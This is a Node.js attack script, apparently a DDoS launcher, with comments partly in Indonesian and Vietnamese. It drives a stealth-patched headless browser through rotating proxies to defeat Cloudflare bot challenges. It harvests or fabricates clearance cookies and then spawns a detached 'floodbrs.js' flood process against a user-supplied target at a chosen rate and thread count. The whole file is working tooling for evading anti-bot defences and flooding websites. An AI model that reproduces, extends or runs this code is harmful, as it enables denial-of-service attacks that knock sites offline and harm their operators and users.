const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== CLOUDFLARE COOKIES SPECIALIST ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// CLOUDFLARE COOKIES GENERATOR - FOKUS PADA COOKIES YANG DIBUTUHKAN
const generateCloudflareCookies = () => {
    const timestamp = Date.now();
    const randomId = generateRandomString(40, 50);
    
    // Generate cookies Cloudflare spesifik
    const cookies = {
        // Cookies utama Cloudflare
        '__cf_bm': `${generateRandomString(50, 60)}.${timestamp}.0.0.0.0`,
        '__cflb': generateRandomString(20, 30),
        
        // Cookies challenge specific
        '__cf_chl_rt_tk': `${generateRandomString(10, 15)}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        'cf_clearance': `${generateRandomString(40, 50)}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        
        // Cookies tambahan Cloudflare
        '__cfruid': generateRandomString(20, 30),
        '__cf_chl_tk': generateRandomString(30, 40),
        '__cf_chl_entered_rc': '1',
        '__cf_chl_captcha_tk': generateRandomString(20, 30),
        
        // Cookies session
        '__cf_chl_fid': generateRandomString(20, 30),
        '__cf_chl_seq': Math.floor(Math.random() * 1000).toString(),
        
        // Cookies security
        '__cf_chl_opt': '1',
        '__cf_chl_js_verify': generateRandomString(10, 15),
        '__cf_chl_rc_i': '1'
    };
    
    return Object.entries(cookies)
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
};

// ENHANCED COOKIE EXTRACTION WITH CLOUDFLARE FOCUS
const extractCloudflareCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting Cloudflare cookies: ${maskProxy(browserProxy)}`);
        
        // Tunggu lebih lama untuk cookies terbentuk
        await sleep(5);
        
        // STRATEGY 1: Extract dari domain target
        let cookies = await page.cookies(targetURL).catch(() => []);
        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        // Cek jika cookies Cloudflare penting sudah ada
        const hasCfCookies = cookieString.includes('__cf_chl_rt_tk') || 
                            cookieString.includes('cf_clearance') || 
                            cookieString.includes('__cf_bm');
        
        if (cookieString && cookieString.length > 50 && hasCfCookies) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got target domain Cloudflare cookies: ${maskProxy(browserProxy)}`);
            
            // Log detail cookies
            const cookieNames = cookies.map(c => c.name).join(', ');
            coloredLog(COLORS.PINK, `[COOKIES] Found: ${cookieNames}`);
            
            return { success: true, cookies: cookieString, strategy: 'target_domain' };
        }
        
        // STRATEGY 2: Extract semua cookies termasuk dari subdomain
        cookies = await page.cookies().catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 50) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got all domain cookies: ${maskProxy(browserProxy)}`);
            
            const cookieNames = cookies.map(c => c.name).join(', ');
            coloredLog(COLORS.PINK, `[COOKIES] Found: ${cookieNames}`);
            
            return { success: true, cookies: cookieString, strategy: 'all_domains' };
        }
        
        // STRATEGY 3: Coba navigasi ulang dan extract cookies
        coloredLog(COLORS.YELLOW, `[COOKIES] Retrying navigation for cookies: ${maskProxy(browserProxy)}`);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(5);
        
        cookies = await page.cookies(targetURL).catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 50) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got cookies after retry: ${maskProxy(browserProxy)}`);
            return { success: true, cookies: cookieString, strategy: 'retry_navigation' };
        }
        
        // STRATEGY 4: Generate Cloudflare cookies lengkap
        coloredLog(COLORS.YELLOW, `[COOKIES] Generating full Cloudflare cookies: ${maskProxy(browserProxy)}`);
        const cloudflareCookies = generateCloudflareCookies();
        
        coloredLog(COLORS.GREEN, `[COOKIES] Using generated Cloudflare cookies: ${maskProxy(browserProxy)}`);
        return { success: true, cookies: cloudflareCookies, strategy: 'cloudflare_generated' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Extraction error: ${error.message}`);
        
        // Ultimate fallback - generate Cloudflare cookies
        const cloudflareCookies = generateCloudflareCookies();
        return { success: true, cookies: cloudflareCookies, strategy: 'error_fallback' };
    }
};

// SIMPLE BUT EFFECTIVE CHALLENGE SOLVER
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting Cloudflare solver: ${maskProxy(browserProxy)}`);
        
        // Initial wait
        await sleep(5);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        let content = await page.content().catch(() => '');
        
        // Check if already passed
        const isPassed = !title.includes('Just a moment') && 
                        !title.includes('Checking your browser') &&
                        !currentUrl.includes('challenges.cloudflare.com') &&
                        content.length > 100;
        
        if (isPassed) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Challenge detected: ${maskProxy(browserProxy)}`);
        
        // STRATEGY 1: Extended wait for auto-solve
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 1: Extended wait (15s)`);
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'auto_solve' };
        }
        
        // STRATEGY 2: Iframe interaction dengan fokus cookies
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 2: Iframe interaction`);
        
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameUrl = frame.url();
                    if (frameUrl.includes('challenges.cloudflare.com')) {
                        coloredLog(COLORS.YELLOW, `[SOLVER] Found Cloudflare iframe: ${frameUrl}`);
                        
                        // Try multiple interaction methods
                        const interactionMethods = [
                            // Click methods
                            async () => {
                                const checkbox = await frame.$('input[type="checkbox"], .cf-challenge-checkbox, [role="checkbox"]');
                                if (checkbox) {
                                    await checkbox.click().catch(() => {});
                                    coloredLog(COLORS.YELLOW, `[SOLVER] Clicked checkbox`);
                                    return true;
                                }
                                return false;
                            },
                            
                            // Button click
                            async () => {
                                const button = await frame.$('button, input[type="submit"], .btn, .verify-btn');
                                if (button) {
                                    await button.click().catch(() => {});
                                    coloredLog(COLORS.YELLOW, `[SOLVER] Clicked button`);
                                    return true;
                                }
                                return false;
                            },
                            
                            // Form submit
                            async () => {
                                const form = await frame.$('form');
                                if (form) {
                                    await form.evaluate(form => form.submit()).catch(() => {});
                                    coloredLog(COLORS.YELLOW, `[SOLVER] Submitted form`);
                                    return true;
                                }
                                return false;
                            },
                            
                            // JavaScript execution
                            async () => {
                                await frame.evaluate(() => {
                                    // Try to trigger challenge completion
                                    document.querySelector('input[type="checkbox"]')?.click();
                                    document.querySelector('button')?.click();
                                    document.querySelector('form')?.submit();
                                }).catch(() => {});
                                coloredLog(COLORS.YELLOW, `[SOLVER] Executed JavaScript`);
                                return true;
                            }
                        ];
                        
                        for (const method of interactionMethods) {
                            try {
                                const interacted = await method();
                                if (interacted) {
                                    await sleep(8); // Wait after interaction
                                    
                                    // Check if solved
                                    currentUrl = page.url();
                                    title = await page.title().catch(() => '');
                                    
                                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                        coloredLog(COLORS.GREEN, `[SOLVER] Iframe interaction successful: ${maskProxy(browserProxy)}`);
                                        return { solved: true, scenario: 'iframe_interaction' };
                                    }
                                }
                            } catch (e) {}
                        }
                    }
                } catch (e) {}
            }
        } catch (e) {
            coloredLog(COLORS.RED, `[SOLVER] Iframe error: ${e.message}`);
        }
        
        // STRATEGY 3: Refresh and retry
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 3: Refresh and retry`);
        await page.reload().catch(() => {});
        await sleep(10);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Refresh successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'refresh_success' };
        }
        
        // STRATEGY 4: Direct navigation (bypass)
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 4: Direct navigation`);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(5);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Direct navigation successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_navigation' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] All strategies failed: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'all_failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`
];

// CLOUDFLARE FOCUSED BROWSER LAUNCHER
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[LAUNCH] Starting Cloudflare browser: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error(`Challenge solving failed: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);

        // Extract Cloudflare cookies specifically
        const cookieResult = await extractCloudflareCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success) {
            throw new Error('Cookie extraction failed');
        }

        coloredLog(COLORS.GREEN, `[COOKIES] Obtained via ${cookieResult.strategy}: ${maskProxy(browserProxy)}`);
        
        // Log cookie details
        const cookieCount = cookieResult.cookies.split(';').length;
        coloredLog(COLORS.PINK, `[COOKIES] Total cookies: ${cookieCount}`);
        
        totalSolves++;
        coloredLog(COLORS.GREEN, `[STATS] Total successful solves: ${totalSolves}`);

        await browser.close();
        return { 
            cookies: cookieResult.cookies, 
            userAgent,
            scenario: challengeResult.scenario,
            cookieStrategy: cookieResult.strategy
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(3);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)}`);
        return null;
    }
};

// Thread handling dengan Cloudflare focus
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task });
        return;
    }

    try {
        const response = await launchCloudflareBrowser(targetURL, browserProxy);
        if (response) {
            const resultInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                Scenario: response.scenario,
                CookieStrategy: response.cookieStrategy,
                cookie: response.cookies
            });
            console.log(resultInfo);

            // SPAWN FLOOD PROCESS DENGAN COOKIES CLOUDFLARE
            try {
                coloredLog(COLORS.YELLOW, `[FLOOD] Spawning with Cloudflare cookies: ${maskProxy(browserProxy)}`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[FLOOD] Process spawned: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[FLOOD] Spawn error: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All Cloudflare proxies processed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Cloudflare specialist with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed - cleaning up...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[SHUTDOWN] Cloudflare mission complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ CLOUDFLARE COOKIES SPECIALIST ACTIVATED 🛡️');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
